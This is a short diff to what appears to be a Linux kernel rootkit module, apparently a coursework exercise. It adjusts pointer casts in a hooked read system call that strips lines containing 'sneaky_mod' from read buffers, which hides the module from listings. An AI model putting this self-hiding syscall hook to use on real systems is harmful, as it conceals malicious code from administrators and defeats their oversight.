@@ -114,7 +114,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
 
   line_start = strnstr(buf, "sneaky_mod", nread);
   if (line_start != NULL) {
-    line_end = strnstr(line_start, "\n", nread + buf - line_start);
+    line_end = strnstr(line_start, "\n", (char*)(nread + buf) - line_start);
     if(line_end !=NULL){
       line_end++;
       memcpy(line_start, line_end, (char *)(buf + nread) - line_end);
@@ -131,7 +131,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
     nread -= (ssize_t)(line_end - line_start);
     */
   }
-  return nread;
+  return (ssize_t)nread;
 }
 
 //The code that gets executed when the module is loaded
